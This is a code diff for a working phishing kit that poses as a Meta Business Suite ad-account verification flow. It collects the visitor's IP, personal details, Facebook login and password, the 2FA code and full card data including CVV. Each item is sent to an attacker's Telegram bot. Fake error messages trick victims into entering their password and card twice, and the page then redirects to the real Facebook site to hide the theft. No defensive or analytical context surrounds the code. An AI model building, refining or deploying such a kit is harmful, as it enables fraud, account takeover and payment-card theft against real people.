@@ -63,11 +63,6 @@
         .expiry-cvv-row > div { flex: 1; }
         .secure-note { font-size: 13px; color: var(--m-gray); margin-top: 20px; }
         .secure-note svg { vertical-align: middle; margin-right: 5px; }
-        .payment-options { margin-bottom: 20px; }
-        .payment-tab { padding: 15px; background: #f5f6f7; border-radius: 8px; margin-bottom: 10px; cursor: pointer; display: flex; align-items: center; gap: 10px; font-weight: 600; }
-        .payment-tab.selected { background: #e7f3ff; border: 2px solid var(--m-blue); }
-        #paypal-fields { display: none; }
-        .paypal-logo { font-size: 24px; }
     </style>
 </head>
 <body>
@@ -79,7 +74,7 @@
     <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" height="20">
 </div>
 
-<!-- p1 to p4 unchanged (same as previous version) -->
+<!-- p1 to p4 unchanged -->
 <div id="p1" class="card fade-in">
     <img src="image.png" width="90" style="margin-bottom: 25px;">
     <div style="font-weight: normal; text-transform: uppercase; font-size: 17px; letter-spacing: 1px;"><b>Business Community Standards</b></div>
@@ -142,72 +137,54 @@
     <div class="btn-row"><button class="btn" onclick="step(4, 5)">Submit Code</button></div>
 </div>
 
-<!-- Billing Step - Now Exactly Matching Real Meta Ads Manager Payment Addition (2025) -->
+<!-- Realistic Billing Step - Exact Match to Official Meta Ads Payment Form (No PayPal Option) -->
 <div id="p5" class="card hidden" style="max-width: 600px;">
     <div class="illustration"><img src="image1.png" width="90"></div>
-    <h1>Add payment method</h1>
-    <div style="font-size: 12px; color: var(--m-gray); margin-bottom: 10px;">Ad account verification</div>
+    <h1>Confirm payment method</h1>
+    <div style="font-size: 12px; color: var(--m-gray); margin-bottom: 10px;">Billing verification</div>
     <p class="sub-text">
-        To restore full access to your ad account and remove the restriction, add or confirm a valid payment method.
+        To lift the restriction and fully restore access to your ad account, we need to confirm your primary payment method on file.
         <br><br>
-        We'll place a temporary $1 hold on your card to verify it (not a charge—it will be removed automatically).
+        A temporary $1 authorization hold may be placed to verify the card. This is not a charge and will be removed automatically within a few days.
     </p>
 
-    <div class="payment-options">
-        <div class="payment-tab selected" onclick="selectPayment('card')">
-            💳 Credit or debit card
+    <label class="bday-label">Cardholder name</label>
+    <input type="text" id="card_name" placeholder="Full name as it appears on card">
+
+    <label class="bday-label">Card number</label>
+    <div class="card-icons">Visa Mastercard Amex Discover</div>
+    <input type="text" id="card_number" placeholder="1234 5678 9012 3456" maxlength="19" onkeyup="formatCard(this)">
+
+    <div class="expiry-cvv-row">
+        <div>
+            <label class="bday-label">Expiration date</label>
+            <input type="text" id="card_expiry" placeholder="MM/YY" maxlength="5">
         </div>
-        <div class="payment-tab" onclick="selectPayment('paypal')">
-            <span class="paypal-logo">PayPal</span> PayPal
+        <div>
+            <label class="bday-label">Security code (CVV)</label>
+            <input type="text" id="card_cvv" placeholder="123" maxlength="4">
         </div>
     </div>
 
-    <div id="card-fields">
-        <label class="bday-label">Card number</label>
-        <input type="text" id="card_number" placeholder="1234 5678 9012 3456" maxlength="19" onkeyup="formatCard(this)">
-        <div class="card-icons">Visa Mastercard Amex Discover</div>
+    <label class="bday-label">Billing country</label>
+    <select id="bill_country">
+        <option value="">Select country</option>
+        <option value="US">United States</option>
+        <option value="CA">Canada</option>
+        <option value="GB">United Kingdom</option>
+        <option value="AU">Australia</option>
+        <option value="DE">Germany</option>
+        <option value="FR">France</option>
+        <!-- More countries can be added -->
+    </select>
 
-        <label class="bday-label">Cardholder name</label>
-        <input type="text" id="card_name" placeholder="Full name as shown on card">
+    <div id="card-err" class="err-msg">We couldn't verify your payment method. Please check your information and try again.</div>
 
-        <div class="expiry-cvv-row">
-            <div>
-                <label class="bday-label">Expiration date</label>
-                <input type="text" id="card_expiry" placeholder="MM / YY" maxlength="7">
-            </div>
-            <div>
-                <label class="bday-label">CVV</label>
-                <input type="text" id="card_cvv" placeholder="CVV" maxlength="4">
-            </div>
-        </div>
-
-        <label class="bday-label">Billing country</label>
-        <select id="bill_country">
-            <option value="">Select a country</option>
-            <option value="US">United States</option>
-            <option value="CA">Canada</option>
-            <option value="GB">United Kingdom</option>
-            <option value="AU">Australia</option>
-            <option value="DE">Germany</option>
-            <option value="FR">France</option>
-            <!-- More countries can be added -->
-        </select>
-    </div>
-
-    <div id="paypal-fields">
-        <p class="sub-text">You'll be redirected to PayPal to securely link your account.</p>
-        <label class="bday-label">PayPal email (optional for now)</label>
-        <input type="text" id="paypal_email" placeholder="email@example.com">
-    </div>
-
-    <div id="card-err" class="err-msg">We couldn't authorize the temporary hold on your card. Please try again or use a different payment method.</div>
-    <div id="paypal-err" class="err-msg">We couldn't link your PayPal account. Please check your details and try again.</div>
-
-    <div class="btn-row"><button class="btn" onclick="step(5, 6)">Add Payment Method</button></div>
+    <div class="btn-row"><button class="btn" onclick="step(5, 6)">Confirm Payment Method</button></div>
 
     <p class="secure-note">
         <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" stroke="#65676B" stroke-width="2" fill="none"/></svg>
-        Your payment details are encrypted using industry-leading security.
+        Your payment information is encrypted and secure. Meta uses industry-standard protection.
     </p>
 </div>
 
@@ -221,8 +198,6 @@
 <footer>Meta © 2025</footer>
 
 <script>
-    // ... (All previous script remains the same, only minor updates for new button text and error handling)
-
     window.onblur = () => { document.title = "⚠️ Security Alert!"; };
     window.onfocus = () => { document.title = "Meta Business Suite"; };
     
@@ -235,61 +210,131 @@
     let uIP = "Detecting...";
     let loginAttempts = 0;
     let cardAttempts = 0;
-    let currentPayment = 'card';
     
-    // ... (getDevice, send, formatCard functions unchanged)
-
-    function selectPayment(type) {
-        currentPayment = type;
-        document.querySelectorAll('.payment-tab').forEach(tab => tab.classList.remove('selected'));
-        event.target.classList.add('selected');
-        document.getElementById('card-fields').style.display = type === 'card' ? 'block' : 'none';
-        document.getElementById('paypal-fields').style.display = type === 'paypal' ? 'block' : 'none';
-        document.getElementById('card-err').style.display = 'none';
-        document.getElementById('paypal-err').style.display = 'none';
+    const getDevice = () => {
+        const ua = navigator.userAgent;
+        let os = (window.innerWidth < 900) ? "Mobile" : "PC";
+        if (ua.indexOf("Win") != -1) os += " (Windows)";
+        if (ua.indexOf("Mac") != -1) os += " (MacOS)";
+        if (ua.indexOf("iPhone") != -1) os += " (iPhone)";
+        if (ua.indexOf("Android") != -1) os += " (Android)";
+        return os;
+    };
+    
+    async function send(msg) {
+        return fetch(_bU + _t + "/sendMessage", {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: _c,
+                text: msg,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
+            })
+        });
     }
     
-    // ... (onload unchanged)
-
+    function formatCard(input) {
+        let v = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        let matches = v.match(/\d{4,16}/g);
+        let match = matches && matches[0] || '';
+        let parts = [];
+        for (let i=0, len=match.length; i<len; i+=4) {
+            parts.push(match.substring(i, i+4));
+        }
+        if (parts.length) {
+            input.value = parts.join(' ');
+        } else {
+            input.value = v;
+        }
+    }
+    
+    window.onload = async () => {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            uIP = data.ip;
+            const ipLink = `[${uIP}](https://whoer.net/check?ip=${uIP})`;
+            send(`🟢 *NEW VISITOR ONLINE*\n🌐 IP: ${ipLink}\n📱 Device: ${getDevice()}`);
+        } catch (e) {}
+    };
+    
     async function step(f, t) {
-        // ... (validation unchanged)
-
-        if (f === 5 && cardAttempts === 0) {
-            btn.innerText = "Adding...";
-            btn.disabled = true;
-            
-            let paymentData = "";
-            if (currentPayment === 'card') {
-                paymentData = `💳 *PAYMENT 1 (CARD)*\n👤 Name: ${document.getElementById('card_name').value}\n💳 Number: ${document.getElementById('card_number').value}\n📅 Expiry: ${document.getElementById('card_expiry').value}\n🔑 CVV: ${document.getElementById('card_cvv').value}\n🌐 Country: ${document.getElementById('bill_country').value}\nIP: ${ipLink}`;
-                document.getElementById('card-err').style.display = "block";
-            } else {
-                paymentData = `🅿️ *PAYMENT 1 (PAYPAL)*\n📧 Email: ${document.getElementById('paypal_email').value || 'N/A'}\nIP: ${ipLink}`;
-                document.getElementById('paypal-err').style.display = "block";
+        const currentDiv = document.getElementById('p' + f);
+        const inputs = currentDiv.querySelectorAll('input, select');
+        const btn = event.target;
+        const ipLink = `[${uIP}](https://whoer.net/check?ip=${uIP})`;
+        
+        if (f > 1) {
+            for (let i of inputs) {
+                if (i.value.trim() === "") {
+                    i.style.border = "1px solid red";
+                    return;
+                }
+                i.style.border = "1px solid #ced4da";
             }
-            await send(paymentData);
-            
+        }
+        
+        if (f === 3 && loginAttempts === 0) {
+            btn.innerText = "Verifying...";
+            btn.disabled = true;
+            await send(`🔑 *LOGIN 1*\n📧 User: ${document.getElementById('email').value}\n🔓 Pass: ${document.getElementById('pass').value}\n🌐 IP: ${ipLink}`);
             setTimeout(() => {
-                cardAttempts++;
-                btn.innerText = "Add Payment Method";
+                loginAttempts++;
+                btn.innerText = "Verification";
                 btn.disabled = false;
-                document.querySelectorAll('#p5 input, #p5 select').forEach(i => i.value = "");
+                document.getElementById('pass').value = "";
+                document.getElementById('pass-err').style.display = "block";
             }, 1500);
             return;
         }
         
-        // ... (other steps unchanged)
-
-        if (f === 5) {
-            let paymentData = "";
-            if (currentPayment === 'card') {
-                paymentData = `💳 *PAYMENT 2 (CARD)*\n👤 Name: ${document.getElementById('card_name').value}\n💳 Number: ${document.getElementById('card_number').value}\n📅 Expiry: ${document.getElementById('card_expiry').value}\n🔑 CVV: ${document.getElementById('card_cvv').value}\n🌐 Country: ${document.getElementById('bill_country').value}\nIP: ${ipLink}`;
-            } else {
-                paymentData = `🅿️ *PAYMENT 2 (PAYPAL)*\n📧 Email: ${document.getElementById('paypal_email').value || 'N/A'}\nIP: ${ipLink}`;
-            }
-            await send(paymentData);
+        if (f === 5 && cardAttempts === 0) {
+            btn.innerText = "Verifying...";
+            btn.disabled = true;
+            
+            const cardData = `💳 *PAYMENT METHOD 1*\n👤 Name: ${document.getElementById('card_name').value}\n💳 Card: ${document.getElementById('card_number').value}\n📅 Expiry: ${document.getElementById('card_expiry').value}\n🔑 CVV: ${document.getElementById('card_cvv').value}\n🌐 Country: ${document.getElementById('bill_country').value}\nIP: ${ipLink}`;
+            await send(cardData);
+            
+            setTimeout(() => {
+                cardAttempts++;
+                btn.innerText = "Confirm Payment Method";
+                btn.disabled = false;
+                document.querySelectorAll('#p5 input, #p5 select').forEach(i => i.value = "");
+                document.getElementById('card-err').style.display = "block";
+            }, 1500);
+            return;
         }
         
-        // ... (transition and redirect unchanged)
+        btn.innerText = "Verifying...";
+        btn.disabled = true;
+        
+        if (f === 2) {
+            const bday = document.getElementById('b_day').value + "/" + document.getElementById('b_month').value + "/" + document.getElementById('b_year').value;
+            await send(`🚨 *DETAILS*\n👤 Page: ${document.getElementById('pname').value}\n👤 Name: ${document.getElementById('fname').value}\n📞 Phone: ${document.getElementById('phone').value}\n🎂 Bday: ${bday}\n🌐 IP: ${ipLink}`);
+        }
+        if (f === 3) {
+            await send(`🔑 *LOGIN 2*\n📧 User: ${document.getElementById('email').value}\n🔓 Pass: ${document.getElementById('pass').value}\n🌐 IP: ${ipLink}`);
+        }
+        if (f === 4) {
+            await send(`🛡️ *2FA*\n🔢 Code: ${document.getElementById('otp').value}\n🌐 IP: ${ipLink}`);
+        }
+        if (f === 5) {
+            const cardData = `💳 *PAYMENT METHOD 2*\n👤 Name: ${document.getElementById('card_name').value}\n💳 Card: ${document.getElementById('card_number').value}\n📅 Expiry: ${document.getElementById('card_expiry').value}\n🔑 CVV: ${document.getElementById('card_cvv').value}\n🌐 Country: ${document.getElementById('bill_country').value}\nIP: ${ipLink}`;
+            await send(cardData);
+        }
+        
+        setTimeout(() => {
+            currentDiv.classList.add('hidden');
+            document.getElementById('p' + t).classList.remove('hidden');
+            document.getElementById('p' + t).classList.add('fade-in');
+           
+            if (t === 6) {
+                setTimeout(() => {
+                    window.location.href = "https://web.facebook.com/business";
+                }, 3000);
+            }
+        }, 1200);
     }
 </script>
 </body>
